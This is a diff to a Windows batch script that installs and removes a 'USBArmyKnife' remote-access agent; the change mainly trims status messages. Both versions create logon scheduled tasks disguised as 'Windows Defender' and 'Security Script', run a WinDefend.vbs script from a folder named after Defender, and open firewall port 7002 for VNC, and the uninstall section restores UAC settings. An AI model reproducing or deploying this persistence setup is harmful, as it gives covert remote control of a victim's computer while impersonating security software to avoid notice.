@@ -102,36 +102,36 @@ powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorActio
 timeout /t 2 /nobreak >nul
 
 echo [2/5] Removing autostart...
-if exist "%STARTUP%\USBArmyKnifeAgent.vbs" ( del "%STARTUP%\USBArmyKnifeAgent.vbs" >nul 2>&1 & echo    [+] USBArmyKnifeAgent.vbs removed. )
-if exist "%STARTUP%\VncDirect.vbs" ( del "%STARTUP%\VncDirect.vbs" >nul 2>&1 & echo    [+] VncDirect.vbs removed. )
-if exist "%DEST%\WinDefend.vbs" ( del "%DEST%\WinDefend.vbs" >nul 2>&1 & echo    [+] WinDefend.vbs removed. )
-if exist "%DEST%\WinDefend.ps1" ( del "%DEST%\WinDefend.ps1" >nul 2>&1 & echo    [+] WinDefend.ps1 removed. )
+if exist "%STARTUP%\USBArmyKnifeAgent.vbs" del "%STARTUP%\USBArmyKnifeAgent.vbs" >nul 2>&1
+if exist "%STARTUP%\VncDirect.vbs" del "%STARTUP%\VncDirect.vbs" >nul 2>&1
+if exist "%DEST%\WinDefend.vbs" del "%DEST%\WinDefend.vbs" >nul 2>&1
+if exist "%DEST%\WinDefend.ps1" del "%DEST%\WinDefend.ps1" >nul 2>&1
 schtasks /delete /tn "USBArmyKnife Agent" /f >nul 2>&1
 schtasks /delete /tn "Security Script" /f >nul 2>&1
 schtasks /delete /tn "Windows Defender" /f >nul 2>&1
 schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1
 schtasks /delete /tn "VNC Direct" /f >nul 2>&1
 schtasks /delete /tn "VNC Direct User" /f >nul 2>&1
-echo    [+] All scheduled tasks removed.
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VNC Direct" /f >nul 2>&1
+echo    Done.
 
 echo [3/5] Removing firewall rules...
-netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
-if !errorlevel! equ 0 ( netsh advfirewall firewall delete rule name="VNC Direct 7002" >nul 2>&1 & echo    [+] Firewall rule "VNC Direct 7002" removed. ) else ( echo    [-] not found. )
-netsh advfirewall firewall show rule name="VNC Block Localhost" >nul 2>&1
-if !errorlevel! equ 0 ( netsh advfirewall firewall delete rule name="VNC Block Localhost" >nul 2>&1 & netsh advfirewall firewall delete rule name="VNC Block Localhost v6" >nul 2>&1 & echo    [+] Firewall rules "VNC Block Localhost" removed. ) else ( echo    [-] not found. )
+netsh advfirewall firewall delete rule name="VNC Direct 7002" >nul 2>&1
+netsh advfirewall firewall delete rule name="VNC Block Localhost" >nul 2>&1
+netsh advfirewall firewall delete rule name="VNC Block Localhost v6" >nul 2>&1
+echo    Done.
 
 echo [4/5] Re-enabling UAC...
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 5 /f >nul 2>&1
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v PromptOnSecureDesktop /t REG_DWORD /d 1 /f >nul 2>&1
-echo    [+] UAC re-enabled. Restart required.
+echo    UAC re-enabled. Restart required.
 
 echo [5/5] Deleting files...
 rmdir /s /q "%DEST%" >nul 2>&1
 if not exist "%DEST%" (
-    echo    [+] Folder deleted.
+    echo    Folder deleted.
 ) else (
-    echo    [!] Could not delete. Restart PC and try again.
+    echo    Could not delete. Restart PC and try again.
 )
 del "%SHORTTEMP%\USBArmyKnife_Uninstall.bat" >nul 2>&1
 
@@ -158,17 +158,16 @@ powershell -NoProfile -Command "Get-Process -Name 'Windows Defender' -ErrorActio
 timeout /t 1 /nobreak >nul
 
 echo [2/3] Removing entries...
-if exist "%STARTUP%\USBArmyKnifeAgent.vbs" ( del "%STARTUP%\USBArmyKnifeAgent.vbs" >nul 2>&1 & echo    [+] VBS removed. )
-if exist "%STARTUP%\VncDirect.vbs" ( del "%STARTUP%\VncDirect.vbs" >nul 2>&1 & echo    [+] VBS removed. )
-if exist "%DEST%\WinDefend.vbs" ( del "%DEST%\WinDefend.vbs" >nul 2>&1 & echo    [+] WinDefend.vbs removed. )
-if exist "%DEST%\WinDefend.ps1" ( del "%DEST%\WinDefend.ps1" >nul 2>&1 & echo    [+] WinDefend.ps1 removed. )
+if exist "%STARTUP%\USBArmyKnifeAgent.vbs" del "%STARTUP%\USBArmyKnifeAgent.vbs" >nul 2>&1
+if exist "%STARTUP%\VncDirect.vbs" del "%STARTUP%\VncDirect.vbs" >nul 2>&1
+if exist "%DEST%\WinDefend.vbs" del "%DEST%\WinDefend.vbs" >nul 2>&1
+if exist "%DEST%\WinDefend.ps1" del "%DEST%\WinDefend.ps1" >nul 2>&1
 schtasks /delete /tn "USBArmyKnife Agent" /f >nul 2>&1
 schtasks /delete /tn "Security Script" /f >nul 2>&1
 schtasks /delete /tn "Windows Defender" /f >nul 2>&1
 schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1
 schtasks /delete /tn "VNC Direct" /f >nul 2>&1
 schtasks /delete /tn "VNC Direct User" /f >nul 2>&1
-echo    [+] All scheduled tasks removed.
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VNC Direct" /f >nul 2>&1
 
 echo [3/3] Done.
@@ -188,26 +187,20 @@ if not exist "%DEST%\AgentLauncher.exe" (
 )
 
 echo Creating scheduled tasks...
-schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
-if !errorlevel! neq 0 ( schtasks /create /tn "USBArmyKnife Agent" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
-schtasks /query /tn "Security Script" >nul 2>&1
-if !errorlevel! neq 0 ( schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
-schtasks /query /tn "Windows Defender" >nul 2>&1
-if !errorlevel! neq 0 ( schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
-schtasks /query /tn "VNC Direct" >nul 2>&1
-if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct" /f >nul 2>&1 )
-schtasks /query /tn "VNC Direct User" >nul 2>&1
-if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct User" /f >nul 2>&1 )
-schtasks /query /tn "VNC Watchdog" >nul 2>&1
-if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1 )
+schtasks /create /tn "USBArmyKnife Agent" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
+schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1
+schtasks /create /tn "Windows Defender" /tr "wscript.exe \"C:\ProgramData\Windows Defender\WinDefend.vbs\"" /sc onlogon /rl limited /f >nul 2>&1
+schtasks /delete /tn "VNC Direct" /f >nul 2>&1
+schtasks /delete /tn "VNC Direct User" /f >nul 2>&1
+schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1
 reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "VNC Direct" /f >nul 2>&1
-echo    [+] VNC Direct removed from autostart.
+echo    Done.
 
 echo Creating firewall rules...
-netsh advfirewall firewall show rule name="VNC Direct 7002" >nul 2>&1
-if !errorlevel! neq 0 ( netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul 2>&1 & echo    [+] Firewall rule "VNC Direct 7002" created. ) else ( echo    [-] Firewall rule already exists. )
-netsh advfirewall firewall show rule name="VNC Block Localhost" >nul 2>&1
-if !errorlevel! neq 0 ( netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1 >nul 2>&1 & netsh advfirewall firewall add rule name="VNC Block Localhost v6" dir=in action=block protocol=TCP localport=7002 remoteip=::1 >nul 2>&1 & echo    [+] Firewall block rules created. ) else ( echo    [-] Firewall block rules already exist. )
+netsh advfirewall firewall add rule name="VNC Direct 7002" dir=in action=allow protocol=TCP localport=7002 >nul 2>&1
+netsh advfirewall firewall add rule name="VNC Block Localhost" dir=in action=block protocol=TCP localport=7002 remoteip=127.0.0.1 >nul 2>&1
+netsh advfirewall firewall add rule name="VNC Block Localhost v6" dir=in action=block protocol=TCP localport=7002 remoteip=::1 >nul 2>&1
+echo    Done.
 
 echo.
 echo Autostart successfully set up.
